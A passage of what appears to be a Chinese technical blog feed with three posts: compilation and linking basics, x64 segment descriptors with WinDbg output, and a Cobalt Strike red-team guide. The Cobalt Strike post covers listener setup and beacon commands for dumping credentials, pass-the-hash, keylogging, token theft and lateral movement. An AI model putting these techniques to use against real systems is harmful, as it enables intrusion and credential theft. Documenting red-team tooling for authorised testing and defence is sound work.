id="1-3-1-基本概念"><a href="#1-3-1-基本概念" class="headerlink" title="1.3.1 基本概念"></a>1.3.1 基本概念</h3><p>用于将源码翻译成汇编指令，其中包括词法分析、语法分析、语义分析等几个重要步骤。</p><p><strong>对应的gcc编译语句如下：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -S hello.i -o hello.s<br><span class="hljs-meta prompt_"># </span><span class="language-bash">或者</span><br>gcc -S hello.c -o hello.s<br><span class="hljs-meta prompt_"># </span><span class="language-bash">或者</span><br>cc1 hello.c<br></code></pre></td></tr></table></figure><p><strong>hello.s：</strong></p><p><img src="/2022/11/14/cheng-xu-gou-jian-ji-chu/image-20221114170229375.png" alt="hello.s文件"></p><h3 id="1-3-2-编译流程图"><a href="#1-3-2-编译流程图" class="headerlink" title="1.3.2 编译流程图"></a>1.3.2 编译流程图</h3><p><img src="/2022/11/14/cheng-xu-gou-jian-ji-chu/image-20221114204111615.png" alt="编译流程图"></p><h3 id="1-3-3-词法分析"><a href="#1-3-3-词法分析" class="headerlink" title="1.3.3 词法分析"></a>1.3.3 词法分析</h3><p>源代码被输入到扫描器，扫描器根据有限状态机将源码的字符序列分割成一系列的记号。产生的记号一般可以分为以下几类：关键字、标识符、字面量（数字、字符串等）和特殊符号（如加号、等号等），并将分析得到的词汇记号分类放入表格，以备后续使用。</p><h3 id="1-3-4-语法分析"><a href="#1-3-4-语法分析" class="headerlink" title="1.3.4 语法分析"></a>1.3.4 语法分析</h3><p>对上面得到的词汇记号进行上下文无关语法分析，生成语法树（以表达式为节点的二叉树），同时确定运算符号的优先级和含义。下图展示了基本语法树：</p><p><img src="/2022/11/14/cheng-xu-gou-jian-ji-chu/image-20221114205727523.png" alt="语法树示意图"></p><h3 id="1-3-5-语义分析"><a href="#1-3-5-语义分析" class="headerlink" title="1.3.5 语义分析"></a>1.3.5 语义分析</h3><p>语法分析只能检查表达式语法层面的正确性，并不能检查该表达式是否有意义，如将一个指针变量与浮点数做乘法。编译器只能进行静态语义分析，主要是对类型的分析与转换。经过语义分析后，语法树会被标识类型。如下图所示：</p><p><img src="/2022/11/14/cheng-xu-gou-jian-ji-chu/image-20221114210504361.png" alt="带类型的语法树"></p><h3 id="1-3-6-中间语言生成与优化"><a href="#1-3-6-中间语言生成与优化" class="headerlink" title="1.3.6 中间语言生成与优化"></a>1.3.6 中间语言生成与优化</h3><p>现代编译器会在生成目标代码前进行源码级的优化，而直接在语法树上做修改效率很差，所以编译器先生成中间代码（不包含数据的尺寸、变量地址和寄存器名字等）作为通用的解释语言（不存在arm、x86等指令集之间的差异），并在中间代码上执行优化策略。</p><h3 id="1-3-7-目标代码生成与优化"><a href="#1-3-7-目标代码生成与优化" class="headerlink" title="1.3.7 目标代码生成与优化"></a>1.3.7 目标代码生成与优化</h3><p>目标代码生成器将上面产生的中间代码转换成目标平台的机器码，目标代码优化器做出指令序列优化，最终生成目标汇编代码。</p><h2 id="1-4-汇编"><a href="#1-4-汇编" class="headerlink" title="1.4 汇编"></a>1.4 汇编</h2><p>用于将汇编代码翻译成机器码</p><p><strong>对应的gcc编译语句如下：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -c hello.s -o hello.o<br><span class="hljs-meta prompt_"># </span><span class="language-bash">或者</span><br>as hello.s -o hello.o<br></code></pre></td></tr></table></figure><p><strong>hello.o：</strong></p><p><img src="/2022/11/14/cheng-xu-gou-jian-ji-chu/image-20221114170413306.png" alt="hello.o"></p><h2 id="1-5-静态链接"><a href="#1-5-静态链接" class="headerlink" title="1.5 静态链接"></a>1.5 静态链接</h2><p>静态链接就是将多个模块化的已经编译好的依赖库代码按照一定的规则组织完整，主要过程包括地址和空间分配、符号决议和重定位等。</p><h3 id="1-5-1-空间与地址分配"><a href="#1-5-1-空间与地址分配" class="headerlink" title="1.5.1 空间与地址分配"></a>1.5.1 空间与地址分配</h3><p>扫描所有的输入目标文件，获得各个Section的长度、属性和位置，并且将输入目标文件中的符号表中的所有符号定义和符号引用整理放到全局符号表中，并且将相同的Section合并生成新的具有映射关系的Segment，此时Segment和符号的虚拟地址都被确定了。</p><h3 id="1-5-2-符号解析与重定位"><a href="#1-5-2-符号解析与重定位" class="headerlink" title="1.5.2 符号解析与重定位"></a>1.5.2 符号解析与重定位</h3><p>根据上一步收集到的信息，解析目标文件的重定位表，解析符号获取类型，根据类型去修复重定位。比如符号解析后发现是外部符号，会去对应的.o文件中得到地址来进行指令地址修复，最终完成静态链接。</p>]]></content>
      
      
      <categories>
          
          <category> build </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike 基础</title>
      <link href="/2022/11/02/cobalt-strike-ji-chu-cao-zuo/"/>
      <url>/2022/11/02/cobalt-strike-ji-chu-cao-zuo/</url>
      
        <content type="html"><![CDATA[<h2 id="1-基本配置"><a href="#1-基本配置" class="headerlink" title="1.基本配置"></a>1.基本配置</h2><h3 id="1-1-组成部分"><a href="#1-1-组成部分" class="headerlink" title="1.1 组成部分"></a>1.1 组成部分</h3><ul><li>teamserver – teamserver       – C2服务器</li><li>cs客户端      – cobaltstrike.jar – 控制端</li><li>beacon                                       – 被控端</li></ul><h3 id="1-2-启动teamserver"><a href="#1-2-启动teamserver" class="headerlink" title="1.2 启动teamserver"></a>1.2 启动teamserver</h3><p>其中teamserver必须运行在Linux  Java环境下，ubuntu相关命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">安装 jdk_11</span><br>sudo apt install openjdk-11-jdk<br><span class="hljs-meta prompt_"># </span><span class="language-bash">启动 teamserver</span><br>sudo ./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]<br></code></pre></td></tr></table></figure><h3 id="1-3-启动cs客户端"><a href="#1-3-启动cs客户端" class="headerlink" title="1.3 启动cs客户端"></a>1.3 启动cs客户端</h3><p>执行sh脚本启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo ./start.sh<br></code></pre></td></tr></table></figure><p>出现如下连接窗口：</p><p><img src="/2022/11/02/cobalt-strike-ji-chu-cao-zuo/image-20221102210607039.png" alt="连接窗口"></p><p>输入teamserver启动时设置的相关参数即可连接，用户名可以随意设置，连接成功即可进入主界面。</p><h2 id="2-功能介绍"><a href="#2-功能介绍" class="headerlink" title="2.功能介绍"></a>2.功能介绍</h2><h3 id="2-1-基本界面"><a href="#2-1-基本界面" class="headerlink" title="2.1 基本界面"></a>2.1 基本界面</h3><p><img src="/2022/11/02/cobalt-strike-ji-chu-cao-zuo/image-20221103103937686.png" alt="基本界面"></p><h3 id="2-2-Pivot图"><a href="#2-2-Pivot图" class="headerlink" title="2.2 Pivot图"></a>2.2 Pivot图</h3><p><strong>示例图如下：</strong></p><p><img src="/2022/11/02/cobalt-strike-ji-chu-cao-zuo/CobaltStrike4.jpg" alt="Pivot图"></p><p><strong>相关字段介绍：</strong></p><ul><li><p><strong>防火墙：</strong>Beacon Payload流量出口</p></li><li><p><strong>红色边框加闪电：</strong>Beacon运行在管理员权限</p></li><li><p><strong>绿色虚线：</strong>使用HTTP、HTTPS协议出网</p></li><li><p><strong>黄色虚线：</strong>使用DNS协议出网</p></li><li><p><strong>两个会话连接：</strong>表示呈现父子关系，子会话通过父会话传递和接受C2指令</p></li><li><p><strong>橙黄色箭头：</strong>两个会话使用Windows命令管道、SSH连接</p></li><li><p><strong>青色箭头：</strong>两个会话使用TCP Socket连接</p></li><li><p><strong>红色箭头：</strong>两个使用Windows命令管道、SSH连接的会话断开</p></li><li><p><strong>紫色箭头：</strong>两个使用TCP Socket连接的会话断开</p></li></ul><h3 id="2-3-监听器"><a href="#2-3-监听器" class="headerlink" title="2.3 监听器"></a>2.3 监听器</h3><p><strong>监听器与Payload绑定，等待被控端回连。</strong></p><h4 id="2-3-1-HTTP-amp-HTTPS-Beacon"><a href="#2-3-1-HTTP-amp-HTTPS-Beacon" class="headerlink" title="2.3.1 HTTP &amp; HTTPS Beacon"></a>2.3.1 HTTP &amp; HTTPS Beacon</h4><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">windows/beacon_http/reverse_http<br>windows/beacon_https/reverse_https<br></code></pre></td></tr></table></figure><p>HTTP和HTTPS区别在于SSL证书配置，最基本的配置如下：</p><p><img src="/2022/11/02/cobalt-strike-ji-chu-cao-zuo/image-20221103152401426.png" alt="HTTP监听器"></p><h4 id="2-3-2-DNS-Beacon"><a href="#2-3-2-DNS-Beacon" class="headerlink" title="2.3.2 DNS Beacon"></a>2.3.2 DNS Beacon</h4><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini">windows/beacon_dns/reverse_dns_txt<br></code></pre></td></tr></table></figure><p><strong>上线原理：</strong>将DNS解析服务器指定到C2服务器</p><p>域名配置中添加两条DNS解析记录，分别为A记录和NS记录，其中A记录指定C2服务器ip，NS子域名绑定A记录域名，示意图如下：</p><p><img src="/2022/11/02/cobalt-strike-ji-chu-cao-zuo/dns%E8%AE%B0%E5%BD%95.png" alt="DNS记录"></p><p>之后在cs的DNS Linstener中添加子域名，这样查询子域名便会上线C2。值得注意的是dns第一次上线不会立刻获取主机信息，需要执行命令或主动获取。</p><h4 id="2-3-3-SMB-Beacon"><a href="#2-3-3-SMB-Beacon" class="headerlink" title="2.3.3 SMB Beacon"></a>2.3.3 SMB Beacon</h4><p><strong>用于父子会话之间通信，SMB协议</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini">windows/beacon_bind_pipe<br></code></pre></td></tr></table></figure><p>SMB Beacon使用命名管道与一个父Beacon进行通信，在由这个父Beacon与C2服务端通信，相当于一个桥梁。因为Windows可以将命名管道通信封装在 SMB 协议中与远程主机进行通信，所以得名SMB Beacon。常用于派生会话或者横向移动。配置页面如下：</p><p><img src="/2022/11/02/cobalt-strike-ji-chu-cao-zuo/image-20221103152903603.png" alt="SMB Beacon"></p><h4 id="2-3-4-TCP-Beacon"><a href="#2-3-4-TCP-Beacon" class="headerlink" title="2.3.4 TCP Beacon"></a>2.3.4 TCP Beacon</h4><p><strong>用于父子会话之间通信，TCP协议</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini">windows/beacon_bind_tcp<br></code></pre></td></tr></table></figure><p>与SMB Beacon类似，配置页面如下：</p><p><img src="/2022/11/02/cobalt-strike-ji-chu-cao-zuo/image-20221103153415163.png" alt="TCP Beacon"></p><h4 id="2-3-5-Foreign-Listeners"><a href="#2-3-5-Foreign-Listeners" class="headerlink" title="2.3.5 Foreign Listeners"></a>2.3.5 Foreign Listeners</h4><p>用来将会话转到MSF服务器</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini">windows/foreign/reverse_http<br>windows/foreign/reverse_https<br>在3.x中还有一种windows/foreign/reverse_tcp<br></code></pre></td></tr></table></figure><p>配置页面如下：</p><p><img src="/2022/11/02/cobalt-strike-ji-chu-cao-zuo/image-20221103153917885.png" alt="Foreign Listeners"></p><h4 id="2-3-6-Pivot-Listeners"><a href="#2-3-6-Pivot-Listeners" class="headerlink" title="2.3.6 Pivot Listeners"></a>2.3.6 Pivot Listeners</h4><p>需要在会话右键菜单中找到（Pivoting -&gt; Listener），用于父子会话之间建立<strong>反向端口转发</strong>，与SMB、TCP监听器类似，不过当执行unlink命令时会直接退出无法像另外两个一样重连。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini">windows/beacon_reverse_tcp<br></code></pre></td></tr></table></figure><p>页面配置如下：</p><p><img src="/2022/11/02/cobalt-strike-ji-chu-cao-zuo/image-20221103154604757.png" alt="Pivot Listeners"></p><h3 id="2-4-会话右键功能"><a href="#2-4-会话右键功能" class="headerlink" title="2.4 会话右键功能"></a>2.4 会话右键功能</h3><ul><li><strong>Access：</strong><ul><li>Dump Hashs：获取用户hash</li><li>Elevate：反弹高权限会话</li><li>Golden Ticket：黄金票据用于在普通用户权限和krbtgt hash的情况下获取管理员权限</li><li>Make Token：制作令牌，访问Windows远程网络资源时有效</li><li>One-liner Run：目标机的本地开启一个web服务</li><li>Mimikatz：运行Mimikatz的logonpasswords命令</li><li>Spawn As：使用其他用户权限生成一个会话，需要用户名和密码以及一个监听器</li></ul></li><li><strong>Explore：</strong><ul><li>Browser Pivot：使用IE代理登录</li><li>Desktop (VNC) ：远程桌面，需要插件支持</li><li>File Browser：文件管理</li><li>Net View：执行网络相关命令</li><li>Port Scan：主机发现，端口扫描</li><li>Process List：获取进程列表</li><li>Screenshot：屏幕截图</li></ul></li><li><strong>Pivoting：</strong><ul><li>SOCKS Server：开启socks4代理，不建议使用</li><li>Listener：监听一个目标主机端口并把流量转发到CS</li></ul></li></ul><h3 id="2-5-会话命令"><a href="#2-5-会话命令" class="headerlink" title="2.5 会话命令"></a>2.5 会话命令</h3><p>Beacon是异步有效负载，即命令不会立即执行，而是插入消息队列，在一定时机下依次执行，并将执行结果显示在Beacon控制台。</p><p>如果误输入可以使用clear清楚命令队列。默认情况下，Beacon每60秒检查一次命令队列，可以使用sleep命令修改间隔时间。常用命令如下：</p><h4 id="2-5-1-信息收集"><a href="#2-5-1-信息收集" class="headerlink" title="2.5.1 信息收集"></a>2.5.1 信息收集</h4><table><thead><tr><th>命令</th><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>drivers</td><td>-</td><td>列出目标机上的盘符信息</td></tr><tr><td>logonpasswords</td><td>-</td><td>执行mimikatz命令获取密码</td></tr><tr><td>hashdump</td><td>-</td><td>转储用户密码哈希</td></tr><tr><td>dcsync</td><td>[DOMAIN.FQDN] &lt;[DOMAIN\user]&gt;</td><td>提取域控中全部或特定用户的密码哈希</td></tr><tr><td>portscan</td><td>[targets] [ports] [arplicmp Inone] [max connections]</td><td>端口扫描</td></tr><tr><td>reg query</td><td>[x86&#x2F;x64] [root&#x2F;path]</td><td>查询注册表键</td></tr><tr><td>reg queryv</td><td>[x86&#x2F;x64] [root&#x2F;path] [subkey]</td><td>查询注册表子键</td></tr></tbody></table><h4 id="2-5-2-远控功能"><a href="#2-5-2-远控功能" class="headerlink" title="2.5.2 远控功能"></a>2.5.2 远控功能</h4><table><thead><tr><th>命令</th><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>clear</td><td>-</td><td>清空命令队列</td></tr><tr><td>sleep</td><td>[time]</td><td>设置命令调度时间，0表示开启交互模式</td></tr><tr><td>download</td><td>[filepath]</td><td>下载目标机文件</td></tr><tr><td>upload</td><td>[filepath]</td><td>上传文件到目标机</td></tr><tr><td>downloads</td><td>-</td><td>列出正在下载的文件</td></tr><tr><td>cancel</td><td>[filename]</td><td>取消全部正在下载的文件</td></tr><tr><td>argue</td><td>[command]  [fake arguments]  | [command]</td><td>欺骗命令参数，假参数需要比真参数长</td></tr><tr><td>browserpivot</td><td>[pid] [x86&#x2F;x64] | [stop]</td><td>浏览器代理</td></tr><tr><td>checkin</td><td>-</td><td>强制回连时发送主机信息</td></tr><tr><td>desktop</td><td>[pid] [x86&#x2F;x64]</td><td>将VNC服务注入到指定进程中运行</td></tr><tr><td>keylogger</td><td>[pid] [x86&#x2F;x64]</td><td>将键盘记录器注入到指定进程中运行</td></tr><tr><td>screenshot</td><td>-</td><td>屏幕截图</td></tr><tr><td>ssh</td><td>[target:port] [user] [pass]</td><td>使用ssh密码远程连接</td></tr><tr><td>ssh-key</td><td>[target:port] [user] [&#x2F;path&#x2F;to&#x2F;key.pem]</td><td>使用ssh密钥远程连接</td></tr><tr><td>setenv</td><td>[arg]</td><td>设置环境变量</td></tr><tr><td>jobs</td><td></td><td>查看后渗透任务列表（有些功能会在其他进程中运行）</td></tr><tr><td>jobkill</td><td>[jid]</td><td>结束一个Beacon后台任务</td></tr><tr><td>blockdlls</td><td>[start] | [stop]</td><td>阻止子进程加载非微软签名DLL，需要目标为Win10以上</td></tr><tr><td>kill</td><td>[pid]</td><td>结束指定进程</td></tr><tr><td>ppid</td><td>[pid]</td><td>伪造指定进程作为父进程</td></tr><tr><td>pth</td><td>[DOMAIN\user] [NTLM hash]</td><td>hash传递攻击</td></tr><tr><td>exit</td><td>-</td><td>结束Beacon进程</td></tr></tbody></table><h4 id="2-5-3-横向渗透"><a href="#2-5-3-横向渗透" class="headerlink" title="2.5.3 横向渗透"></a>2.5.3 横向渗透</h4><table><thead><tr><th>命令</th><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>connect</td><td>[target] [port]</td><td>连接到一个TCP Beacon</td></tr><tr><td>elevate</td><td>[exp] [listener]</td><td>提权并生成一个高权限会话</td></tr><tr><td>inject</td><td>[pid] [x86&#x2F;x64] [listener]</td><td>在指定进程中派生会话</td></tr><tr><td>jump</td><td>[exp] [target] [listener]</td><td>横向渗透在目标上执行payload生成会话</td></tr><tr><td>link</td><td>[pipe_name]</td><td>连接指定管道名字的SMB会话</td></tr><tr><td>unlink</td><td>-</td><td>断开与子Beacon的连接</td></tr><tr><td>mode</td><td>dns | dns6 | dns-txt</td><td>使用DNS A | DNS AAAA | DNS TXT作为数据通道(仅限DNS Beacon有效)</td></tr><tr><td>spawn</td><td>[x86&#x2F;x64] [listener]</td><td>默认使用rundll32.exe中派生会话</td></tr><tr><td>spawnto</td><td>[x86&#x2F;x64] [path]</td><td>设置spawn派生会话时使用的程序</td></tr><tr><td>spawnas</td><td>[DOMAIN\user] [password] [listener]</td><td>以其他用户身份派生会话</td></tr><tr><td>spawnu</td><td>[pid] [listener]</td><td>在指定进程中派生会话</td></tr></tbody></table><h4 id="2-5-4-代码执行"><a href="#2-5-4-代码执行" class="headerlink" title="2.5.4 代码执行"></a>2.5.4 代码执行</h4><table><thead><tr><th>命令</th><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>dllload</td><td>[pid] [dllpath]</td><td>使用LoadLibrary进行DLL注入，目标机上必须存在被注入的DLL</td></tr><tr><td>dllinject</td><td>[pid] [dllpath]</td><td>反射式DLL注入，路径为本机</td></tr><tr><td>shinject</td><td>[pid] [x86&#x2F;x64] [shellcode_raw_path]</td><td>shellcode注入</td></tr><tr><td>execute-assembly</td><td>[.netpath] [arguments]</td><td>内存加载执行.NET程序</td></tr><tr><td>execute</td><td>[program] [arguments]</td><td>执行程序无回显</td></tr><tr><td>run</td><td>[program] [arguments]</td><td>执行程序有回显</td></tr><tr><td>runas</td><td>[DOMAIN\user] [password] [command] [arguments]</td><td>以其他用户权限执行程序</td></tr><tr><td>runasadmin</td><td>[exp] [command] [args]</td><td>提权后执行命令</td></tr><tr><td>runu</td><td>[pid] [command] [arguments]</td><td>使用指定进程执行命令</td></tr><tr><td>shell</td><td>[command]</td><td>使用cmd执行命令</td></tr><tr><td>inline-execute</td><td>[&#x2F;path&#x2F;to&#x2F;file.o] [args]</td><td>在Beacon会话中执行Beacon Object File (BOF)</td></tr><tr><td>mimikatz</td><td>[&lt;! | @&gt;module::command] [args]</td><td>执行mimikatz命令，!强制提升到System权限运行，@强制当前令牌运行</td></tr><tr><td>powershell</td><td>[cmd]</td><td>使用powershell.exe执行命令</td></tr><tr><td>psinject</td><td>[pid] [arch] [commandLet] [arguments]</td><td>在指定进程中执行PowerShell命令</td></tr><tr><td>powershell-import</td><td>[path]</td><td>导入powershell脚本</td></tr><tr><td>powerpick</td><td>[commandlet] [arguments]</td><td>不使用powershell.exe程序来执行powershell命令</td></tr><tr><td>remote-exec</td><td>[method] [target] [command]</td><td>在远程主机上执行命令</td></tr></tbody></table><h4 id="2-5-5-权限提升"><a href="#2-5-5-权限提升" class="headerlink" title="2.5.5 权限提升"></a>2.5.5 权限提升</h4><table><thead><tr><th>命令</th><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>getprivs</td><td>-</td><td>启用当前访问令牌所拥有的特权</td></tr><tr><td>getsystem</td><td>-</td><td>尝试模拟一个SYSTEM账号的令牌获取System权限</td></tr><tr><td>getuid</td><td>-</td><td>获取当前访问令牌</td></tr><tr><td>make_token</td><td>[user] [pass]</td><td>创建令牌</td></tr><tr><td>rev2self</td><td>-</td><td>恢复Beacon原始令牌</td></tr><tr><td>steal_token</td><td>[pid]</td><td>从指定进程中窃取访问令牌</td></tr></tbody></table><h4 id="2-5-6-内网渗透"><a href="#2-5-6-内网渗透" class="headerlink" title="2.5.6 内网渗透"></a>2.5.6 内网渗透</h4><table><thead><tr><th>命令</th><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>rportfwd</td><td>[bind port] [forward host] [forward port]</td><td>开启反向端口转发<br>流量经过路径Beacon —-&gt; cs teamserver —–&gt; target host</td></tr><tr><td>rportfwd stop</td><td>[bind port]</td><td>停止指定端口转发</td></tr><tr><td>rportfwd_local</td><td>[bind port] [forward host] [forward port]</td><td>开启反向端口转发<br>流量经过路径Beacon —-&gt; cs client —–&gt; target host</td></tr><tr><td>rportfwd_local stop</td><td>[bind port]</td><td>停止指定端口转发</td></tr><tr><td>socks</td><td>[stop] | [port]</td><td>在指定端口开启SOCK4代理，不建议使用</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> red-team </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
            <tag> cs </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>x64保护模式</title>
      <link href="/2022/10/25/x64-bao-hu-mo-shi/"/>
      <url>/2022/10/25/x64-bao-hu-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="1-分段机制"><a href="#1-分段机制" class="headerlink" title="1.分段机制"></a>1.分段机制</h1><h2 id="1-1-强制平坦化"><a href="#1-1-强制平坦化" class="headerlink" title="1.1 强制平坦化"></a>1.1 强制平坦化</h2><p>​在x64中，gdt表中普通段描述符中不再描述基址Base和界限Limit，<strong>基址永远是0</strong>，<strong>界限永远是最大的</strong>，只有属性还在使用。</p><p><strong>fs</strong>、<strong>gs</strong>没有强制平坦，而是在msr寄存器中记录了基址：</p><table><thead><tr><th>名称</th><th>地址</th><th>内容</th><th>用途</th></tr></thead><tbody><tr><td>IA32_FS_BASE</td><td>MSR[0xC0000100]</td><td>fs基址</td><td>x86 teb</td></tr><tr><td>IA32_GS_BASE</td><td>MSR[0xC0000101]</td><td>gs基址</td><td>x64 teb&#x2F;kpcr</td></tr><tr><td>IA32_KERNEL_GS_BASE</td><td>MSR[0xC0000102]</td><td>kpcr&#x2F;teb基址</td><td>x64暂存kpcr或者teb</td></tr></tbody></table><p><strong>swapgs</strong>特权指令：交换 IA32_GS_BASE 和 IA32_KERNEL_GS_BASE 的值，使gs在系统调用后指向KPCR</p><h2 id="1-2-描述符宽度"><a href="#1-2-描述符宽度" class="headerlink" title="1.2 描述符宽度"></a>1.2 描述符宽度</h2><ul><li><p>cs、ds段描述符仍是64位</p></li><li><p>TSS段描述符扩展到128位</p></li><li><p>中断门描述符扩展到128位</p></li></ul><h2 id="1-3-数据-x2F-代码段描述符"><a href="#1-3-数据-x2F-代码段描述符" class="headerlink" title="1.3 数据&#x2F;代码段描述符"></a>1.3 数据&#x2F;代码段描述符</h2><p><img src="/2022/10/25/x64-bao-hu-mo-shi/image-20220816180848020.png" alt="数据/代码段描述符"></p><p><strong>L：</strong>置1表示指令按照64位解读。</p><p><strong>G：</strong>粒度，置1单位4kb，0单位1byte</p><p><strong>D：</strong>置1表示32位操作数，0表示16位操作数</p><p><strong>P：</strong>1表示有效，0表示无效</p><p><strong>DPL：</strong>描述符权限（0-3）</p><p><strong>S：</strong>1表示数据&#x2F;代码段，0表示系统段，系统段就是TSS之类的</p><p><strong>Type：</strong>属性，具体属性如下：</p><p><img src="/2022/10/25/x64-bao-hu-mo-shi/1660404668990-ab8d1196-9ced-4176-9b87-ed9f7d85ec98.png" alt="段属性"></p><h2 id="1-4-手动拆分gdt表"><a href="#1-4-手动拆分gdt表" class="headerlink" title="1.4 手动拆分gdt表"></a>1.4 手动拆分gdt表</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs text">kd&gt; dq fffff8044b890fb0<br>fffff804`4b890fb0  00000000`00000000 00000000`00000000<br>fffff804`4b890fc0  00209b00`00000000 00409300`00000000<br>fffff804`4b890fd0  00cffb00`0000ffff 00cff300`0000ffff<br>fffff804`4b890fe0  0020fb00`00000000 00000000`00000000<br>fffff804`4b890ff0  4b008b88`f0000067 00000000`fffff804<br>fffff804`4b891000  0040f300`00003c00 00000000`00000000<br>fffff804`4b891010  00000000`00000000 00000000`00000000<br>fffff804`4b891020  00000000`00000000 00000000`00000000<br><br>============================================================================================<br><br>kd&gt; dg 10<br>                                                    P Si Gr Pr Lo<br>Sel        Base              Limit          Type    l ze an es ng Flags<br>---- ----------------- ----------------- ---------- - -- -- -- -- --------<br>0010 00000000`00000000 00000000`00000000 Code RE Ac 0 Nb By P  Lo 0000029br0 代码段<br>kd&gt; dg 18<br>                                                    P Si Gr Pr Lo<br>Sel        Base              Limit          Type    l ze an es ng Flags<br>---- ----------------- ----------------- ---------- - -- -- -- -- --------<br>0018 00000000`00000000 00000000`00000000 Data RW Ac 0 Bg By P  Nl 00000493r0 数据段<br>kd&gt; dg 20<br>                                                    P Si Gr Pr Lo<br>Sel        Base              Limit          Type    l ze an es ng Flags<br>---- ----------------- ----------------- ---------- - -- -- -- -- --------<br>0020 00000000`00000000 00000000`ffffffff Code RE Ac 3 Bg Pg P  Nl 00000cfbr3 代码段<br>kd&gt; dg 28<br>                                                    P Si Gr Pr Lo<br>Sel        Base              Limit          Type    l ze an es ng Flags<br>---- ----------------- ----------------- ---------- - -- -- -- -- --------<br>0028 00000000`00000000 00000000`ffffffff Data RW Ac 3 Bg Pg P  Nl 00000cf3r3 数据段<br>kd&gt; dg 30<br>                                                    P Si Gr Pr Lo<br>Sel        Base              Limit          Type    l ze an es ng Flags<br>---- ----------------- ----------------- ---------- - -- -- -- -- --------<br>0030 00000000`00000000 00000000`00000000 Code RE Ac 3 Nb By P  Lo 000002fbr3 代码段<br>kd&gt; dg 40<br>                                                    P Si Gr Pr Lo<br>Sel        Base              Limit          Type    l ze an es ng Flags<br>---- ----------------- ----------------- ---------- - -- -- -- -- --------<br>0040 00000000`4b88f000 00000000`00000067 TSS32 Busy 0 Nb By P  Nl 0000008bTSS32段<br>kd&gt; dg 48<br>                                                    P Si Gr Pr Lo<br>Sel        Base              Limit          Type    l ze an es ng Flags<br>---- ----------------- ----------------- ---------- - -- -- -- -- --------<br>0048 00000000`0000ffff 00000000`0000f804 &lt;Reserved&gt; 0 Nb By Np Nl 00000000TSS的一部分基址<br>kd&gt; dg 50<br>                                                    P Si Gr Pr Lo<br>Sel        Base              Limit          Type    l ze an es ng Flags<br>---- ----------------- ----------------- ---------- - -- -- -- -- --------<br>0050 00000000`00000000 00000000`00003c00 Data RW Ac 3 Bg By P  Nl 000004f3r3 数据段<br></code></pre></td></tr></table></figure><p><strong>手动拆分r0代码段：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">00209b00`00000000<br><br>2 -&gt; 0010<br>G：0byte<br>D：016位操作数<br>L：1x64<br>AVL：0<br><br>9 -&gt; 1001<br>P：1有效<br>DPL：0r0<br><br>b -&gt; 1011<br>Type: 1011 代码段<br></code></pre></td></tr></table></figure><h2 id="1-5-TSS段"><a href="#1-5-TSS段" class="headerlink" title="1.5 TSS段"></a>1.5 